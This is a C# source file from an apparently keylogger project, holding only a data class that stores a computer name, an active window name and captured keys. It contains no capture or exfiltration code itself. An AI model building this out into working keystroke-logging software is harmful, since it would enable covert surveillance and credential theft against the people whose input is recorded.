using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class LoggerData
    {
        public string ComputerName { get; set; }
        public string WindowName { get; set; }
        public string Keys { get; set; }

        public LoggerData(string computerName, string windowName, string keys)
        {
            ComputerName = computerName;
            WindowName = windowName;
            Keys = keys;
        }

        public LoggerData()
        {

        }
    }
}
